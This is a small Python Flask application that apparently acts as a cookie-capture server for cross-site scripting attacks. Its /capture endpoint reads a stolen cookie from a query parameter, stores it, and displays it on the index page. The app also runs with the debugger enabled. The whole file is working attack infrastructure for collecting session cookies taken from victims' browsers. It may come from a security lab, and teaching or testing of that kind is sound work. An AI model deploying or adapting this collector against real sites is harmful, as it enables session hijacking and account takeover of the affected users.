from flask import Flask, render_template, request
app = Flask(__name__)

captured_cookie = ""

@app.route('/')
def home():
    global captured_cookie
    return render_template('index.html', cookie=captured_cookie)

@app.route('/capture')
def capture():
    global captured_cookie
    captured_cookie = request.args.get('cookie', 'No cookies captured')
    return 'Cookie Captured'

if __name__ == "__main__":
    app.run(port=5001, debug=True)
